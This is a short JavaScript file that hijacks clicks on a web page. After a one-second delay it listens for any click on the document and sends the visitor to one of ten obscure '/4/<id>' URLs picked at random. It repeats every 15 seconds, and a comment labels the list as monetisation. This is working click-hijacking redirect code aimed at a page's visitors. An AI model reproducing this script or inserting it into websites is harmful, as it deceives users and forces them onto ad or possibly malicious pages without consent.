function init() {
  var arr = [
    // mon: db
    "https://thelrourg.net/4/7237942",
    "https://woafoame.net/4/7237941",
    "https://corgouzaptax.com/4/7474716",
    "https://eeptoabs.com/4/7420689",
    "https://thechoansa.com/4/7237907",

    "https://psomtenga.net/4/7420696",
    "https://kaushooptawo.net/4/7237921",
    "https://vekseptaufin.com/4/7420698",
    "https://thomtubsaro.com/4/7436813",
    "https://grushoungy.com/4/7614690",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 15000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);